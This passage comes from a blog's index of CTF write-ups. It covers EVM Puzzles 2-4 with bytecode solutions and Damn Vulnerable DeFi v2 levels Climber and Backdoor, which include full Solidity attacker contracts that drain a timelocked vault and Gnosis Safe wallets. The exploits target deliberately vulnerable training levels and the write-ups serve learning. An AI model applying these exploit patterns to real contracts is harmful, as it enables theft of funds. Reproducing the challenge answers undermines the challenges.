        <content type="html"><![CDATA[<h1 id="puzzles-2"><a href="#puzzles-2" class="headerlink" title="puzzles_2"></a>puzzles_2</h1><p>CODESIZE获取bytecode的长度，我们的bytecode长度为10。然后会减去我们的CALLVALUE，得到一个值X，然后跳转到X的位置，X的位置要求是JUMPDEST，因此只能是6。所以，10 - X = 6，因此CALLVALUE=4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 2 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      03      SUB</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      5B      JUMPDEST</span><br><span class="line">07      00      STOP</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br><span class="line"></span><br><span class="line">? Enter the value to send: 4</span><br><span class="line"></span><br><span class="line">Puzzle solved!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 15.EVM Puzzles </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.puzzles_3</title>
      <link href="/2023/07/27/15.EVM%20Puzzles/03.puzzles_3/"/>
      <url>/2023/07/27/15.EVM%20Puzzles/03.puzzles_3/</url>
      
        <content type="html"><![CDATA[<h1 id="puzzles-3"><a href="#puzzles-3" class="headerlink" title="puzzles_3"></a>puzzles_3</h1><p>跳转，输入calldata长度，只能跳转到04，那么输入字节长度为4的任意内容即可，我输入0x00000000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 3 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      36      CALLDATASIZE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      5B      JUMPDEST</span><br><span class="line">05      00      STOP</span><br><span class="line"></span><br><span class="line">? Enter the calldata: 0x00000000</span><br><span class="line"></span><br><span class="line">Puzzle solved!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 15.EVM Puzzles </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.puzzles_4</title>
      <link href="/2023/07/27/15.EVM%20Puzzles/04.puzzles_4/"/>
      <url>/2023/07/27/15.EVM%20Puzzles/04.puzzles_4/</url>
      
        <content type="html"><![CDATA[<h1 id="puzzles-4"><a href="#puzzles-4" class="headerlink" title="puzzles_4"></a>puzzles_4</h1><p>异或的结果为a然后可以跳转完成。固定的题目长度为0x0c，也就是1100，需要输入CALLVALUE=X，需要： 0x0c ^ X = a，也就是1100 ^ X = 1010，因此X=0110即6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 4 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      18      XOR</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br><span class="line">0A      5B      JUMPDEST</span><br><span class="line">0B      00      STOP</span><br><span class="line"></span><br><span class="line">? Enter the value to send: 6</span><br><span class="line"></span><br><span class="line">Puzzle solved!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 15.EVM Puzzles </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.digest</title>
      <link href="/2023/07/27/15.EVM%20Puzzles/00.digest/"/>
      <url>/2023/07/27/15.EVM%20Puzzles/00.digest/</url>
      
        <content type="html"><![CDATA[<h1 id="digest"><a href="#digest" class="headerlink" title="digest"></a>digest</h1>]]></content>
      
      
      <categories>
          
          <category> 15.EVM Puzzles </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.digest</title>
      <link href="/2023/07/24/14.Paradigm%20CTF%202022/00.digest/"/>
      <url>/2023/07/24/14.Paradigm%20CTF%202022/00.digest/</url>
      
        <content type="html"><![CDATA[<h1 id="Paradigm-CTF-2022"><a href="#Paradigm-CTF-2022" class="headerlink" title="Paradigm CTF 2022"></a>Paradigm CTF 2022</h1><p>the code is in <a href="https://github.com/chen4903/Paradigm-2022">github</a></p>]]></content>
      
      
      <categories>
          
          <category> 14.Paradigm CTF 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12.Climber</title>
      <link href="/2023/07/20/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/12.Climber/"/>
      <url>/2023/07/20/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/12.Climber/</url>
      
        <content type="html"><![CDATA[<h1 id="Climber"><a href="#Climber" class="headerlink" title="Climber"></a>Climber</h1><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><h3 id="1-overview"><a href="#1-overview" class="headerlink" title="1.overview"></a>1.overview</h3><p>There are a lot of contract:</p><ul><li>ClimberTimelock: controls the ClimberVault</li><li>ClimberVault: holds the asset and uses UUPS pattern</li><li>UUPS, etc. : UUPS pattern</li></ul><p>In this level, our goal is to get the entire money in the ClimberVault</p><h3 id="2-analyses"><a href="#2-analyses" class="headerlink" title="2.analyses"></a>2.analyses</h3><p>We can get the entire money by <code>sweepFunds()</code> while it can be called only by ClimberTimelock and transfers to ClimberTimelock . But we can upgrade the contract because of UUPS pattern.</p><p>ClimberTimelock contract is important since it holds a lot of authority. In this level, there is some problem with execute() which we can exploit. In normal situation, the execution is that: call <code>schedule()</code> first, and then call <code>execute()</code>. <code>schedule()</code> can only be called by PROPOSER_ROLE but everyone can call <code>execute()</code>.</p><p>So we, a normal member, not PROPOSER_ROLE, can exploit <code>execute()</code>. In this function, it executes <code>functionCallWithValue()</code> first which contains call() in <code>address.sol</code> library and then check if <code>operations[id].executed = true;</code> that only can be set in <code>schedule()</code>. It means everyone can call <code>execute</code> with the proposals containing making our proposals true.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function execute(</span><br><span class="line">    address[] calldata targets,</span><br><span class="line">    uint256[] calldata values,</span><br><span class="line">    bytes[] calldata dataElements,</span><br><span class="line">    bytes32 salt</span><br><span class="line">) external payable &#123;</span><br><span class="line">    require(targets.length &gt; 0, &quot;Must provide at least one target&quot;);</span><br><span class="line">    require(targets.length == values.length);</span><br><span class="line">    require(targets.length == dataElements.length);</span><br><span class="line"></span><br><span class="line">    bytes32 id = getOperationId(targets, values, dataElements, salt);</span><br><span class="line"></span><br><span class="line">    for (uint8 i = 0; i &lt; targets.length; i++) &#123;</span><br><span class="line">        targets[i].functionCallWithValue(dataElements[i], values[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    require(getOperationState(id) == OperationState.ReadyForExecution);</span><br><span class="line">    operations[id].executed = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So our idea is that:</p><ol><li>make delay to zero so that we can attack right now.</li><li>grant PROPOSER_ROLE to attack contract</li><li>upgrade climbervalut which contains a new <code>sweepFunds()</code>. and this new <code>sweepFunds()</code> can be call by the attack contract and send money to the attack contract.</li></ol><h2 id="solutions"><a href="#solutions" class="headerlink" title="solutions"></a>solutions</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;</span><br><span class="line">import &quot;../climber/ClimberTimelock.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;../climber/ClimberVault.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ClimberAttacker is UUPSUpgradeable&#123;</span><br><span class="line">    ClimberTimelock  immutable timelock;</span><br><span class="line">    address immutable vaultProxyAddress;</span><br><span class="line">    IERC20 immutable token;</span><br><span class="line">    address immutable attacker;</span><br><span class="line"></span><br><span class="line">    constructor(ClimberTimelock _timelock, address _vaultProxyAddress,IERC20 _token)&#123;</span><br><span class="line">        timelock = _timelock;</span><br><span class="line">        vaultProxyAddress = _vaultProxyAddress;</span><br><span class="line">        token = _token;</span><br><span class="line">        attacker = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buildProposal() internal returns(address[]memory,uint256[]memory,bytes[]memory)&#123;</span><br><span class="line">        address[] memory targets = new address[](5);</span><br><span class="line">        uint256[] memory values = new uint256[](5);</span><br><span class="line">        bytes[] memory dataElements = new bytes[](5);</span><br><span class="line"></span><br><span class="line">        //upgrade delay to zero</span><br><span class="line">        targets[0] = address(timelock);</span><br><span class="line">        values[0] = 0;</span><br><span class="line">        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector,0);</span><br><span class="line"></span><br><span class="line">        // grant our attack contract PROPOSER_ROLE</span><br><span class="line">        targets[1] = address(timelock);</span><br><span class="line">        values[1] = 0;</span><br><span class="line">        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector,timelock.PROPOSER_ROLE(),address(this));</span><br><span class="line"></span><br><span class="line">        // execute our malicious proposal</span><br><span class="line">        targets[2] = address(this);</span><br><span class="line">        values[2] = 0;</span><br><span class="line">        dataElements[2] = abi.encodeWithSelector(ClimberAttacker.scheduleProposal.selector);</span><br><span class="line"></span><br><span class="line">        // upgrade our implementation contract: climbervault</span><br><span class="line">        targets[3] = address(vaultProxyAddress);</span><br><span class="line">        values[3] = 0;</span><br><span class="line">        dataElements[3] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector,address(this));</span><br><span class="line">        </span><br><span class="line">        // get the money</span><br><span class="line">        targets[4] = address(vaultProxyAddress);</span><br><span class="line">        values[4] = 0;</span><br><span class="line">        dataElements[4] = abi.encodeWithSelector(ClimberAttacker.sweepFunds.selector);</span><br><span class="line">        </span><br><span class="line">        return (targets,values,dataElements);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">// schedule our malicious proposal</span><br><span class="line">    function scheduleProposal()external &#123;</span><br><span class="line">        (address[] memory targets,uint256[] memory values,bytes[] memory dataElements) = buildProposal();</span><br><span class="line">        timelock.schedule(targets, values, dataElements, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">// execute our malicious proposal</span><br><span class="line">    function executeProposal() external &#123;</span><br><span class="line">        (address[] memory targets,uint256[] memory values,bytes[] memory dataElements) = buildProposal();</span><br><span class="line">        timelock.execute(targets, values, dataElements, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">// exploit the money</span><br><span class="line">    function sweepFunds()external &#123;</span><br><span class="line">        token.transfer(attacker,token.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">// must override this function, because it is an interface</span><br><span class="line">    function _authorizeUpgrade(address newImplementation) internal  override &#123;&#125;</span><br><span class="line">       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 05.Damn Vulnerable DeFi v2 CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11.backdoor</title>
      <link href="/2023/07/20/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/11.backdoor/"/>
      <url>/2023/07/20/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/11.backdoor/</url>
      
        <content type="html"><![CDATA[<h1 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h1><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><h3 id="1-overview"><a href="#1-overview" class="headerlink" title="1.overview"></a>1.overview</h3><p>In this level, there is a walletRegistry. As long as someone registries a gnosis wallet, he can get 10 DVT. Up to now, 4 guys have registered, but they haven’t called <code>proxyCreated()</code>. Our goal is to their DVTs in total 40.</p><p>There is only one contract providing us. In fact, it involves several other contracts, especially GnosisSafeProxyFactory and GnosisSafe.</p><h3 id="2-theory-of-gnosis-wallet"><a href="#2-theory-of-gnosis-wallet" class="headerlink" title="2.theory of gnosis wallet"></a>2.theory of gnosis wallet</h3><p>Creating a gnosis wallet is cheap because it uses clone pattern which doesn’t need to deploy the entire logic contract. </p><p>To solve this level, we must know how gnosis wallet works and is created.</p><p>The proxy contract is created in GnosisSafeProxyFactory contract. And we can create a gnosis wallet by <code>createProxyWithCallback()</code>. Attention, it contains a variable named initializer which we can exploit while it is used to initialized the wallet.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function createProxyWithCallback(</span><br><span class="line">    address _singleton,</span><br><span class="line">    bytes memory initializer,</span><br><span class="line">    uint256 saltNonce,</span><br><span class="line">    IProxyCreationCallback callback</span><br><span class="line">) public returns (GnosisSafeProxy proxy) &#123;</span><br><span class="line">    uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));</span><br><span class="line">    proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);</span><br><span class="line">    if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And then, <code>createProxyWithCallback()</code> will call <code>createProxyWithNonce()</code>. It will call the initializer to initialized as long as it doesn’t wrong.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function createProxyWithNonce(</span><br><span class="line">    address _singleton,</span><br><span class="line">    bytes memory initializer,</span><br><span class="line">    uint256 saltNonce</span><br><span class="line">) public returns (GnosisSafeProxy proxy) &#123;</span><br><span class="line">    proxy = deployProxyWithNonce(_singleton, initializer, saltNonce);</span><br><span class="line">    if (initializer.length &gt; 0)</span><br><span class="line">        // solhint-disable-next-line no-inline-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) &#123;</span><br><span class="line">                revert(0, 0)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    emit ProxyCreation(proxy, _singleton);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>After that, it will call <code>deployProxyWithNonce()</code> which uses <code>CREATE2</code> to create a wallet. By the way, the bytecode in <code>CREATE2</code> is constant because it uses clone pattern.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function deployProxyWithNonce(</span><br><span class="line">    address _singleton,</span><br><span class="line">    bytes memory initializer,</span><br><span class="line">    uint256 saltNonce</span><br><span class="line">) internal returns (GnosisSafeProxy proxy) &#123;</span><br><span class="line">    // If the initializer changes the proxy address should change too. Hashing the initializer data is cheaper than just concatinating it</span><br><span class="line">    bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce));</span><br><span class="line">    bytes memory deploymentData = abi.encodePacked(type(GnosisSafeProxy).creationCode, uint256(uint160(_singleton)));</span><br><span class="line">    // solhint-disable-next-line no-inline-assembly</span><br><span class="line">    assembly &#123;</span><br><span class="line">        proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)</span><br><span class="line">    &#125;</span><br><span class="line">    require(address(proxy) != address(0), &quot;Create2 call failed&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-attack-logic"><a href="#3-attack-logic" class="headerlink" title="3.attack logic"></a>3.attack logic</h3><p>As we know, they four registered but don’t call <code>proxyCreated()</code> to get 10 DET yet. We help them to call because there is no limit. So we can exploit during  help them :)</p><p>There are a lot of <code>require()</code> in it, let’s analyses it:</p><ul><li><code>require(token.balanceOf(address(this)) &gt;= TOKEN_PAYMENT, &quot;Not enough funds to pay&quot;);</code>: the level contract should hold enough DVT.</li><li><code>require(msg.sender == walletFactory, &quot;Caller must be factory&quot;);</code>: Only GnosisSafeProxyFactory can call it.</li><li><code>require(singleton == masterCopy, &quot;Fake mastercopy used&quot;);</code>: we can only create the same wallet which is masterCopy</li><li><code>require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, &quot;Wrong initialization&quot;);</code>: the wallet must initialized by <code>setup()</code>. We can exploit in it! Because we can pass any data in <code>setup()</code></li><li><code>require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, &quot;Invalid threshold&quot;);</code>: Threshold must be 1.</li><li><code>require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, &quot;Invalid number of owners&quot;);</code> : there must be only one owner.</li><li><code>require(beneficiaries[walletOwner], &quot;Owner is not registered as beneficiary&quot;);</code>: the owner must registry in this contract.</li></ul><p>We know we can do something in <code>setup()</code>. the wallet someone creates will call <code>setup()</code>  and then it will do something with <code>to</code> and <code>data</code>. If the <code>data</code> contains <code>approve()</code>, <code>to</code> can use <code>transferFrom</code> to  transfer wallet’s DVT!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function setup(</span><br><span class="line">    address[] calldata _owners,</span><br><span class="line">    uint256 _threshold,</span><br><span class="line">    address to,</span><br><span class="line">    bytes calldata data,</span><br><span class="line">    address fallbackHandler,</span><br><span class="line">    address paymentToken,</span><br><span class="line">    uint256 payment,</span><br><span class="line">    address payable paymentReceiver</span><br><span class="line">) external &#123;</span><br><span class="line">    // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice</span><br><span class="line">    setupOwners(_owners, _threshold);</span><br><span class="line">    if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);</span><br><span class="line">    // As setupOwners can only be called if the contract has not been initialized we don&#x27;t need a check for setupModules</span><br><span class="line">    setupModules(to, data);</span><br><span class="line"></span><br><span class="line">    if (payment &gt; 0) &#123;</span><br><span class="line">        // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)</span><br><span class="line">        // baseGas = 0, gasPrice = 1 and gas = payment =&gt; amount = (payment + 0) * 1 = payment</span><br><span class="line">        handlePayment(payment, 0, 1, paymentToken, paymentReceiver);</span><br><span class="line">    &#125;</span><br><span class="line">    emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So our attack is that: build a data with <code>approve()</code> as initializer to create the wallet. Then we can call <code>transferFrom()</code>  to steal DVT!</p><h2 id="solutions"><a href="#solutions" class="headerlink" title="solutions"></a>solutions</h2><p>contract</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import  &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract GnosisWalletAttacker&#123;</span><br><span class="line">   GnosisSafeProxyFactory public factory;</span><br><span class="line">   IProxyCreationCallback public callback;</span><br><span class="line">   address[] public users;</span><br><span class="line">   address public singleton;</span><br><span class="line">   address token;</span><br><span class="line"></span><br><span class="line">   constructor (address _factory,address _callback,address[] memory _users,address _singleton,address _token)public &#123;</span><br><span class="line">        factory=GnosisSafeProxyFactory(_factory);</span><br><span class="line">        callback=IProxyCreationCallback(_callback);</span><br><span class="line">        users=_users;</span><br><span class="line">        singleton=_singleton;</span><br><span class="line">        token=_token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address _token,address spender)public&#123;</span><br><span class="line">        IERC20(_token).approve(spender,10 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()public &#123;</span><br><span class="line">        bytes memory data=abi.encodeWithSignature(&quot;approve(address,address)&quot;,token,address(this));</span><br><span class="line"></span><br><span class="line">        for(uint256 i = 0; i &lt; users.length; i++)&#123;</span><br><span class="line">            address[] memory owners = new address[](1);</span><br><span class="line">            owners[0] = users[i];</span><br><span class="line">           bytes memory initializer = abi.encodeWithSignature(&quot;setup(address[],uint256,address,bytes,address,address,uint256,address)&quot;,</span><br><span class="line">                owners,</span><br><span class="line">                1,</span><br><span class="line">                address(this),</span><br><span class="line">                data,</span><br><span class="line">                address(0),</span><br><span class="line">                address(0),</span><br><span class="line">                0,</span><br><span class="line">                address(0)</span><br><span class="line">           );</span><br><span class="line">           GnosisSafeProxy proxy=factory.createProxyWithCallback(singleton,initializer,0,callback);</span><br><span class="line"></span><br><span class="line">           IERC20(token).transferFrom(address(proxy),tx.origin,10 ether);</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">attack</span> = <span class="keyword">await</span> (<span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;GnosisWalletAttacker&quot;</span>,attacker)).<span class="title function_">deploy</span>(</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">walletFactory</span>.<span class="property">address</span>,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">walletRegistry</span>.<span class="property">address</span>,</span><br><span class="line">        users,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">masterCopy</span>.<span class="property">address</span>,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">token</span>.<span class="property">address</span></span><br><span class="line">    )</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">attack</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">attack</span>()</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 05.Damn Vulnerable DeFi v2 CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.digest</title>
      <link href="/2023/07/20/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/00.digest/"/>
      <url>/2023/07/20/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/00.digest/</url>
      
